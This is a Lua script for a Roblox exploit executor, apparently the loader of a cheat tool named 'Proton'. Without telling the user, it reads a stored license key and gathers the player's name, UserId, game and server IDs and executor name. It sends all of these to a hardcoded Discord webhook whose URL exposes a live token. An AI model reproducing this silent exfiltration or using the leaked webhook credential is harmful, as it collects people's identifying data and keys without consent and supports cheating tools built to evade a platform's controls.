local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer

local request =
	syn and syn.request
	or http and http.request
	or http_request
	or request

if not request then
	warn("No HTTP request function available")
	return
end

local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1463053568847380663/-WZLA0CZNiwUjYHwTrC8Zi-ncCP0jaHW70UBDRpwRFXDfdTh5Ate8ILatccpd10yPkv6"
local ROOT = "Proton-main"
local KEY_PATH = ROOT.."/Profiles/DO_NOT_TOUCH_CONTAINS_KEY.txt"

local key = "Unknown"
if isfile and isfile(KEY_PATH) then
	key = readfile(KEY_PATH)
elseif getgenv and getgenv().PROTON_KEY then
	key = getgenv().PROTON_KEY
end

local LOADED_SUCCESSFULLY = true

local gameName = "Unknown"
pcall(function()
	gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

local avatar = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png")
	:format(player.UserId)

local executor =
	identifyexecutor and identifyexecutor()
	or getexecutorname and getexecutorname()
	or "Unknown Executor"

local payload = {
	username = "Proton Logger",
	embeds = {
		{
			title = "🚀 Proton Execution Log",
			color = LOADED_SUCCESSFULLY and 0x57F287 or 0xED4245,
			thumbnail = { url = avatar },
			fields = {
				{ name = "Player", value = player.Name, inline = true },
				{ name = "UserId", value = tostring(player.UserId), inline = true },
				{ name = "Key", value = "```"..key.."```", inline = false },
				{ name = "Game", value = gameName, inline = false },
				{ name = "PlaceId", value = tostring(game.PlaceId), inline = true },
				{ name = "JobId", value = game.JobId, inline = false },
				{
					name = "Loaded Successfully",
					value = LOADED_SUCCESSFULLY and "🟢 Yes" or "🔴 No",
					inline = true
				}
			},
			footer = {
				text = "Executor: "..executor
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}
	}
}

request({
	Url = WEBHOOK_URL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = HttpService:JSONEncode(payload)
})

